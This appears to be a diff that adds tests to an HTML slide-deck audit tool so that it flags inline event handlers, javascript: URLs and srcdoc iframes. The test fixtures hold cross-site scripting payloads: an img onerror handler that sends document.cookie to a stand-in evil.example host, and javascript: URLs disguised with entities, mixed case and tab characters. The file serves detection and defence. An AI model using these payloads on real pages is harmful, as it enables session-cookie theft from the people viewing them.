@@ -15,7 +15,7 @@ import { tmpdir } from 'node:os';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
 
-import { classifyScripts, auditDeck, formatLabel, isBootCall, runtimeVersion, installedRuntime } from '../cli/audit.mjs';
+import { classifyScripts, auditDeck, formatLabel, isBootCall, runtimeVersion, installedRuntime, executableAttributes } from '../cli/audit.mjs';
 
 const here = path.dirname(fileURLToPath(import.meta.url));
 const ROOT = path.resolve(here, '..');
@@ -125,6 +125,84 @@ test('a script hiding behind an unknown type is still named', () => {
   assert.equal(auditDeck(html).counts.unaccounted, 1);
 });
 
+// ── executable attributes: the vector that never needs a block ─────────────
+
+test('an inline onerror handler is named, with its line and its tag', () => {
+  // The convenient injection: no <script> anywhere, so the block scan sees
+  // nothing — and 'unsafe-inline' in the CSP is exactly what lets it run.
+  const html = `<script data-decklight-runtime="js">var Decklight = {}</script>
+<script>Decklight.init()</script>
+<img src=x onerror="fetch('//evil.example/' + document.cookie)">`;
+  const report = auditDeck(html);
+  assert.equal(report.counts.unaccounted, 0, 'no script BLOCK was added — that is the point of the vector');
+  assert.equal(report.counts.handlers, 1);
+  const [h] = report.handlers;
+  assert.equal(h.line, 3, 'the coordinate a person can act on');
+  assert.equal(h.tag, 'img');
+  assert.equal(h.attr, 'onerror');
+  assert.match(h.snippet, /evil\.example/);
+});
+
+test('a javascript: URL is named; a data: image is not', () => {
+  const html = `<a href="javascript:alert(1)">click me</a>
+<img src="data:image/png;base64,iVBORw0KGgo=">
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>`;
+  const found = executableAttributes(html);
+  assert.deepEqual(found.map((f) => [f.tag, f.attr]), [['a', 'href'], ['iframe', 'src']],
+    'a data: IMAGE is how every bundled deck inlines its pictures — flagging it would cry wolf on all of them');
+});
+
+test('entity and whitespace games do not hide a javascript: URL', () => {
+  // Browsers decode character references and strip control characters before
+  // reading the scheme, so the scan has to see the value the way they do.
+  for (const href of ['JaVaScRiPt:alert(1)', 'jav&#x61;script:alert(1)', '&#106;avascript:alert(1)', 'java\tscript:alert(1)', '  javascript:alert(1)']) {
+    assert.equal(executableAttributes(`<a href="${href}">x</a>`).length, 1, href);
+  }
+  assert.equal(executableAttributes('<a href="https://example.com/javascript:notascheme">x</a>').length, 0,
+    'javascript: mid-path is a path, not a scheme');
+});
+
+test('an inline srcdoc document is named — it inherits the deck CSP', () => {
+  const found = executableAttributes('<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>');
+  assert.equal(found.length, 1);
+  assert.equal(found[0].attr, 'srcdoc');
+});
+
+test('handlers mentioned in prose, comments, code samples and script text are not findings', () => {
+  // The mask that keeps the label credible: none of these is an attribute on
+  // a real tag, and a label that cried wolf on a slide ABOUT XSS would be
+  // turned off within a day.
+  const html = `<script data-decklight-runtime="js">var Decklight = {}; var s = '<img src=x onerror=alert(1)>';</script>
+<!-- beware onerror="never" on an <img src=x onerror=nope> -->
+<p>write onclick="…" on the element to wire a handler</p>
+<p alt="the string onclick=x inside a value is a value">ok</p>
+<pre><code>&lt;img src=x onerror=alert(1)&gt;</code></pre>
+<style>/* onload="x" is css text */</style>
+<script>Decklight.init()</script>`;
+  const report = auditDeck(html);
+  assert.equal(report.counts.handlers, 0);
+  assert.equal(report.counts.unaccounted, 0);
+});
+
+test('a quoted > inside an attribute does not end the tag scan early', () => {
+  // data-chart JSON legitimately contains ">" — a tag walker that stopped
+  // there would misread everything after it.
+  const html = `<section data-chart='{"a":"x > y"}' onclick="steal()"><h2>t</h2></section>`;
+  const found = executableAttributes(html);
+  assert.equal(found.length, 1);
+  assert.equal(found[0].attr, 'onclick');
+});
+
+test('the label names executable attributes, and says so when there are none', () => {
+  const clean = `<script data-decklight-runtime="js">var Decklight = {}</script><script>Decklight.init()</script>`;
+  assert.match(formatLabel(auditDeck(clean)).join('\n'), /0 inline handlers or executable URLs in attributes/,
+    'the zero line is what states this class of content was examined at all');
+  const dirty = clean + `\n<img src=x onerror="fetch('//evil')">`;
+  const text = formatLabel(auditDeck(dirty)).join('\n');
+  assert.match(text, /1 executable attribute — this file runs code outside any script block/);
+  assert.match(text, /line\s+2\s+<img>\s+onerror=/);
+});
+
 // ── the false positives that would kill it ─────────────────────────────────
 
 test('a comment that TALKS about <script> is not a script block', () => {
@@ -151,6 +229,8 @@ test('every shipped deck reports only its own author script — no phantoms', ()
       assert.doesNotMatch(b.snippet, /^[,)\]}]/, `${rel}:${b.line} — a finding starting mid-expression is a mis-paired match`);
     }
     assert.ok(report.counts.data > 0, `${rel} has cast/manifest JSON, and it is counted as data`);
+    assert.equal(report.counts.handlers, 0,
+      `${rel} — no shipped deck carries an inline handler, so any finding here is a phantom: ${JSON.stringify(report.handlers)}`);
   }
   assert.equal(auditDeck(readFileSync(path.join(ROOT, 'demo/intro.html'), 'utf8')).counts.unaccounted, 0,
     'intro.html carries no author script at all');
@@ -239,6 +319,21 @@ test('--check exits non-zero and names the block, from any directory', () => {
   assert.equal(code, 1);
   assert.match(out, /1 unaccounted script block/);
   assert.match(out, /line\s+2\s+.*evil\.example/);
+});
+
+test('--check exits non-zero on an inline handler, even with 0 unaccounted blocks', () => {
+  // The gap this whole ticket is about: the label used to print "0 unaccounted
+  // script blocks" and exit 0 while the handler ran in front of the audience.
+  const dir = mkdtempSync(path.join(tmpdir(), 'decklight-audit-'));
+  const deck = path.join(dir, 'talk.html');
+  writeFileSync(deck, `<script>var Decklight = {}</script><script>Decklight.init()</script>
+<img src=x onerror="fetch('//evil.example/' + document.cookie)">`);
+  const { code, out } = run(['present', '--check', deck]);
+  rmSync(dir, { recursive: true, force: true });
+  assert.equal(code, 1);
+  assert.match(out, /0 unaccounted script blocks/, 'the block count is honest — there is no block');
+  assert.match(out, /1 executable attribute/);
+  assert.match(out, /line\s+2\s+<img>\s+onerror=/);
 });
 
 test('--check on a real bundled deck is quiet, and loud once tampered with', () => {
